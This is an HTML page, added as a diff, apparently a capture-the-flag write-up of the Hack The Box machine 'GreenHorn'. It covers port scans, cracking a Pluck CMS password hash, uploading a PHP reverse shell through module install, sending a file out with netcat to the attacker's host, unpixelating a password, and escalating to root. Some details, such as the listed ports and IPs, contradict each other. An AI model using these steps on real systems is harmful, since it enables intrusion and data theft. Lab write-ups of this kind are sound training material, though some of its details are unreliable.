@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Greenhorn</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Greenhorn Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:600/format:webp/0*GSGGmT-bgqHQ4mAu.png" alt="Image" class="Image1">
+            <h2>Reconnaissance</h2>
+            <p class="paragraph">Let’s discover the services that are running on the target I performed a port scan.
+            <p class="script-container">
+                nmap -sS -p- -n -Pn --min-rate=9362 $IP<br>
+                nmap -A -p $Port $IP
+            </p><br>
+            -sS: This option specifies a SYN scan<br>
+            -p-: This option tells nmap to scan all 65,535 ports.<br>
+            -n: This option is speeds up the scan by avoiding DNS resolution.<br>
+            -Pn: This option disables host discovery, treating all hosts as online. This is useful for scanning hosts that may be blocking ICMP ping requests.<br>
+            --min-rate=9362: This option sets the minimum number of packets per second to be sent during the scan. This speeds up the scan but may increase the likelihood of being detected by security systems.<br>
+            -A: This option enables OS detection, version detection, script scanning, and traceroute.<br>
+            <p class="script-container">
+                ┌──(gh0st㉿kali)-[~/Downloads/VPNs]<br>
+└─$ sudo nmap -sV -sC -v 10.10.11.25<br>   
+[sudo] password for gh0st:<br>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 03:18 EDT<br>
+NSE: Loaded 156 scripts for scanning.<br>
+NSE: Script Pre-scanning.<br>
+Initiating NSE at 03:18<br>
+Completed NSE at 03:18, 0.00s elapsed<br>
+Initiating NSE at 03:18<br>
+Completed NSE at 03:18, 0.00s elapsed<br>
+Initiating NSE at 03:18<br>
+Completed NSE at 03:18, 0.00s elapsed<br>
+Initiating Ping Scan at 03:18<br>
+Scanning 10.10.11.25 [4 ports]<br>
+Completed Ping Scan at 03:18, 0.10s elapsed (1 total hosts)<br>
+Initiating Parallel DNS resolution of 1 host. at 03:18<br>
+Completed Parallel DNS resolution of 1 host. at 03:18, 0.04s elapsed<br>
+Initiating SYN Stealth Scan at 03:18<br>
+Scanning 10.10.11.25 [1000 ports]<br>
+Discovered open port 80/tcp on 10.10.11.25<br>
+Discovered open port 22/tcp on 10.10.11.25<br>
+Discovered open port 3000/tcp on 10.10.11.25<br>
+Completed SYN Stealth Scan at 03:18, 2.15s elapsed (1000 total ports)<br>
+Initiating Service scan at 03:18<br>
+Scanning 3 services on 10.10.11.25<br>
+Completed Service scan at 03:20, 91.16s elapsed (3 services on 1 host)<br>
+NSE: Script scanning 10.10.11.25.<br>
+Initiating NSE at 03:20<br>
+Completed NSE at 03:20, 2.59s elapsed<br>
+Initiating NSE at 03:20<br>
+Completed NSE at 03:20, 1.12s elapsed<br>
+Initiating NSE at 03:20<br>
+Completed NSE at 03:20, 0.00s elapsed<br>
+Nmap scan report for 10.10.11.25<br>
+Host is up (0.10s latency).<br>
+Not shown: 997 closed tcp ports (reset)<br>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>
+| ssh-hostkey: <br>
+|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)<br>
+|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)<br>
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)<br>
+| http-methods: <br>
+|_  Supported Methods: GET HEAD POST OPTIONS<br>
+|_http-server-header: nginx/1.18.0 (Ubuntu)<br>
+|_http-title: Did not follow redirect to http://greenhorn.htb/<br>
+3000/tcp open  ppp?<br>
+| fingerprint-strings: <br>
+|   GenericLines, Help, RTSPRequest: <br>
+|     HTTP/1.1 400 Bad Request<br>
+|     Content-Type: text/plain; charset=utf-8<br>
+|     Connection: close<br>
+|     Request<br>
+|   GetRequest: <br>
+|     HTTP/1.0 200 OK<br>
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform<br>
+|     Content-Type: text/html; charset=utf-8<br>
+|     Set-Cookie: i_like_gitea=47a84c070fcb2aff; Path=/; HttpOnly; SameSite=Lax<br>
+|     Set-Cookie: _csrf=V3QocUSqp9ydL3oQIlAFzKzpsjg6MTcyMTk3ODM0NTE5NjU5ODI4MQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax<br>
+|     X-Frame-Options: SAMEORIGIN<br>
+|     Date: Fri, 26 Jul 2024 07:19:05 GMT<br>
+            </p>
+            Ports 22, 80, 3000, 6644, 8000 are open on the target, and more details.<br>
+            http-title: Did not follow redirect to http://greenhorn.htb/<br><br>
+            indicates that the HTTP service running on port 80 is configured to redirect requests to http://greenhorn.htb . However, the tool you used to scan (likely nmap) did not follow this redirect because it doesn't resolve the greenhorn.htb domain name <br><br>
+            Add an entry to your /etc/hosts file to map the greenhorn.htb domain to the IP address of the target machine. This will allow your system to resolve greenhorn.htb to the correct IP address.<br>
+            <p class="script-container">
+                PORT     STATE SERVICE VERSION<br>
+            22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>
+            80/tcp   open  http    nginx 1.18.0 (Ubuntu)<br>
+            | http-cookie-flags: <br>
+            |   /: <br>
+            |     PHPSESSID: <br>
+            |_      httponly flag not set<br>
+            |_http-generator: pluck 4.7.18<br>
+            | http-robots.txt: 2 disallowed entries <br>
+            |_/data/ /docs/<br>
+            |_http-server-header: nginx/1.18.0 (Ubuntu)<br>
+            | http-title: Welcome to GreenHorn ! - GreenHorn<br>
+            |_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn<br>
+            |_http-trane-info: Problem with XML parsing of /evox/about<br>
+            |_https-redirect: ERROR: Script execution failed (use -d to debu<br>
+            </p>
+            Result after add $IP to hosts file on port 80.
+        </p>
+        <h2>Enumeration</h2>
+        <p class="paragraph">
+            Let’s check web server on port 80.
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*sVqYr1uGAGvV-SG3I1MS4w.png">
+        <p class="paragraph">
+            The URL parameter file might be used to include files on the server-side.<br> This can potentially be exploited for Local File Inclusion (LFI) if the parameter is not properly sanitized.<br><br>
+            Didn’t work but after directory scanner we find /login.php .
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*VBHzHf_O1Z457omiaRgxWw.png">
+        <p class="paragraph">
+            On port 3000 we come to an application with a signup and login function. Lets test it out!<br><br>
+            We then get:
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*lVjZxboash5P6ljjEAnBbg.png">
+        <p class="paragraph">
+            Let’s Create a User and see what we can find.<br><br>
+            Bingo!
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*u0I-5QsumWr8ObmPIol6Og.png">
+        <p class="paragraph">
+            Now have access to the source code repository of the GreenHorn application. This can be very useful for finding vulnerabilities.<br>
+            analysis login.php
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*kITgx1yGOy31oY7te6bDAA.png">
+        <p class="paragraph">
+            When a user submits the login form, the script hashes the provided password using SHA-512 and stores it in the variable $pass.<br>
+            The script then compares the hashed value in $pass with the hashed value in $ww.
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Rjbrz86KIPfURZQLPX9idw.png">
+        <p class="paragraph">
+            The pass.php file contains a hashed password stored in the variable $ww<br>
+            Let’s try crack this hash.
+            <p class="script-container">
+                sudo john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt <br>
+                Using default input encoding: UTF-8<br>
+                Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])<br>
+                Warning: poor OpenMP scalability for this hash type, consider --fork=6<br>
+                Will run 6 OpenMP threads<br>
+                Press 'q' or Ctrl-C to abort, almost any other key for status<br>
+                iloveyou1        (?)     <br>
+                1g 0:00:00:00 DONE (2024-07-26 10:42) 50.00g/s 307200p/s 307200c/s 307200C/s 123456..iheartyou<br>
+                Use the "--show" option to display all of the cracked passwords reliably<br>
+                Session completed.
+            </p>
+            Cracked admin password, Let’s login in /login
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*PXTBFdghrd4xGsGOCxsMFQ.png">
+        <p class="paragraph">
+            Let’s try adding a PHP Reverse Shell.<br><br>
+            Let’s try to find an exploit for this version pluck 4.7.18<br><br>
+            Found : Pluck v4.7.18 — Remote Code Execution (RCE)<br><br>
+        </p>
+        <h2>Exploitation</h2>
+        <p class="paragraph">
+            Modules can be downloaded and implemented<br>
+            Install website modules in .zip format and are extracted on the server and executed.<br>
+            Let’s add PHP Reverse Shell on compressed file and upload it.<br>
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*cXbP2Q-TWqjTiiEbYpoGww.png">
+        <p class="script-container">
+            rlwrap nc -nlvp 9001 <br>
+            listening on [any] 9001 ...<br>
+            connect to [10.10.14.7] from (UNKNOWN) [10.10.11.25] 36464<br>
+            Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux<br>
+            15:15:31 up  4:38,  0 users,  load average: 0.07, 0.05, 0.01<br>
+            USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
+            /bin/sh: 0: can't access tty; job control turned off<br>
+            $
+        </p>
+        <p class="paragraph">
+            Got a shell!
+        </p>
+        <p class="script-container">
+            rlwrap nc -nlvp 9001 <br>
+            listening on [any] 9001 ...<br>
+            connect to [10.10.14.7] from (UNKNOWN) [10.10.11.25] 36464<br>
+            Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux<br>
+            15:15:31 up  4:38,  0 users,  load average: 0.07, 0.05, 0.01<br>
+            USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
+            /bin/sh: 0: can't access tty; job control turned off<br>
+            $ ls<br>
+            bin<br>
+            boot<br>
+            cdrom<br>
+            data<br>
+            dev<br>
+            etc<br>
+            home<br>
+            lib<br>
+            lib32<br>
+            lib64<br>
+            libx32<br>
+            lost+found<br>
+            media<br>
+            mnt<br>
+            opt<br>
+            proc<br>
+            root<br>
+            run<br>
+            sbin<br>
+            srv<br>
+            sys<br>
+            tmp<br>
+            usr<br>
+            var<br>
+            $ cd /home<br>
+            $ ls<br>
+            git<br>
+            junior<br>
+            $ cd junior<br>
+        </p>
+        <p class="paragraph">
+            Don’t have access on user flag :(
+        </p>
+        <h2>Privilege Escalation</h2>
+        <p class="paragraph">
+            Let’s search on file owned by user junior
+            <p class="script-container">
+                www-data@greenhorn:/home/junior$ find / -type f -user junior 2>/dev/null<br>
+                find / -type f -user junior 2>/dev/null<br>
+                /usr/local/bin/gitea<br>
+                www-data@greenhorn:/home/junior$ <br>
+                www-data@greenhorn:/$ ls -l /usr/local/bin/gitea<br>
+                ls -l /usr/local/bin/gitea<br>
+                -rwxrwxrwx 1 junior junior 138332624 Apr 16 03:44 /usr/local/bin/gitea<br>
+            </p>
+            <p class="script-container">
+                www-data@greenhorn:/$ /usr/local/bin/gitea<br>
+                /usr/local/bin/gitea<br>
+                2024/07/23 17:23:16 ...etting/repository.go:292:loadRepositoryFrom() [W] SCRIPT_TYPE "bash" is not on the current PATH. Are you sure that this is the correct SCRIPT_TYPE?<br>
+                2024/07/23 17:23:16 cmd/web.go:242:runWeb() [I] Starting Gitea on PID: 3718<br>
+                2024/07/23 17:23:16 cmd/web.go:111:showWebStartupMessage() [I] Gitea version: 1.21.11 built with GNU Make 4.3, go1.21.8 : bindata, sqlite, sqlite_unlock_notify<br>
+                2024/07/23 17:23:16 cmd/web.go:112:showWebStartupMessage() [I] * RunMode: prod<br>
+                2024/07/23 17:23:16 cmd/web.go:113:showWebStartupMessage() [I] * AppPath: /usr/local/bin/gitea<br>
+                2024/07/23 17:23:16 cmd/web.go:114:showWebStartupMessage() [I] * WorkPath: /usr/local/bin<br>
+                2024/07/23 17:23:16 cmd/web.go:115:showWebStartupMessage() [I] * CustomPath: /usr/local/bin/custom<br>
+                2024/07/23 17:23:16 cmd/web.go:116:showWebStartupMessage() [I] * ConfigFile: /usr/local/bin/custom/conf/app.ini<br>
+                2024/07/23 17:23:16 cmd/web.go:117:showWebStartupMessage() [I] Prepare to run install page<br>
+                2024/07/23 17:23:16 cmd/web.go:304:listen() [I] Listen: http://0.0.0.0:3000<br>
+                2024/07/23 17:23:16 cmd/web.go:308:listen() [I] AppURL(ROOT_URL): http://localhost:3000/<br>
+                2024/07/23 17:23:16 ...s/graceful/server.go:70:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 3718<br>
+                2024/07/23 17:23:16 ...s/graceful/server.go:96:ListenAndServe() [E] Unable to GetListener: listen tcp 0.0.0.0:3000: bind: address already in use<br>
+                2024/07/23 17:23:16 cmd/web.go:353:listen() [E] Failed to start server: listen tcp 0.0.0.0:3000: bind: address already in use<br>
+                2024/07/23 17:23:16 cmd/web.go:355:listen() [I] HTTP Listener: 0.0.0.0:3000 Closed<br>
+                2024/07/23 17:23:16 cmd/web.go:139:serveInstall() [E] Unable to open listener for installer. Is Gitea already running?<br>
+                2024/07/23 17:23:16 .../graceful/manager.go:168:doHammerTime() [W] Setting Hammer condition<br>
+                2024/07/23 17:23:17 .../graceful/manager.go:184:doTerminate() [W] Terminating<br>
+                2024/07/23 17:23:17 ...eful/manager_unix.go:216:handleSignals() [W] PID: 3718. Background context for manager closed - context canceled - Shutting down...<br>
+                2024/07/23 17:23:17 cmd/web.go:145:serveInstall() [I] PID: 3718 Gitea Web Finished<br>
+                Command error: listen tcp 0.0.0.0:3000: bind: address already in use.<br>
+            </p>
+            <p class="script-container">
+                www-data@greenhorn:/$ su junior<br>
+                su junior<br>
+                Password: iloveyou1<br><br>
+                junior@greenhorn:/$id<br>
+                id<br>
+                uid=1000(junior) gid=1000(junior) groups=1000(junior)<br>
+                junior@greenhorn:/$ <br>
+            </p>
+            Now got user flag.
+            <p class="script-container">
+                junior@greenhorn:~$ ls<br>
+                ls<br>
+                user.txt  'Using OpenVAS.pdf'<br>
+                junior@greenhorn:~$ nc 10.10.24.6 1234 < 'Using OpenVAS.pdf'<br>
+                nc 10.10.24.6 1234 < 'Using OpenVAS.pdf'<br><br>
+                junior@greenhorn:~$
+            </p>
+        </p>
+        <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*eCOOPwSyXutUODWcsm0lNQ.png">
+        <p class="paragraph">
+            It is a pixelated image containing a password.<br>
+            There tool called Depix.<br>
+            Depix is a PoC for a technique to recover plaintext from pixelized screenshots.<br>
+            <p class="script-container">
+                python3 depix.py -p /home/gh0st/Pictures/Screenshot_2024-07-26_11_29_58.png -s /home/gh0st/Pictures/Screenshot_2024-07-26_11_29_58.png -o image.png<br>
+                2024-07-26 11:38:10,500 - Loading pixelated image from /home/gh0st/Pictures/Screenshot_2024-07-26_11_29_58.png<br>
+                2024-07-26 11:38:11,759 - Loading search image from /home/gh0st/Pictures/Screenshot_2024-07-26_11_29_58.png<br>
+                2024-07-26 11:38:13,051 - Finding color rectangles from pixelated space<br>
+                2024-07-26 11:38:13,129 - Found 314 same color rectangles<br>
+                2024-07-26 11:38:13,129 - 306 rectangles left after moot filter<br>
+                2024-07-26 11:38:13,130 - Found 74 different rectangle sizes<br>
+                2024-07-26 11:38:13,130 - Finding matches in search image<br>
+                2024-07-26 11:38:13,130 - Scanning 195 blocks with size (1, 1)<br>
+                2024-07-26 11:38:13,186 - Scanning in searchImage: 0/1919<br>
+            </p>
+            Now root password.
+            <p class="script-container">
+                $ python3 -c 'import pty;pty.spawn("/bin/bash")'<br>
+                www-data@greenhorn:/$ su root<br>
+                su root<br>
+                Password: sidefromsidetheothersidesidefromsidetheotherside<br><br>
+                root@greenhorn:/# id<br>
+                id<br>
+                uid=0(root) gid=0(root) groups=0(root)<br>
+                root@greenhorn:/# cd<br>
+                cd<br>
+                root@greenhorn:~# ls<br>
+                ls<br>
+                cleanup.sh  restart.sh  root.txt<br>
+                root@greenhorn:~# <br>
+            </p>
+            Here we got root Privilege.
+        </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
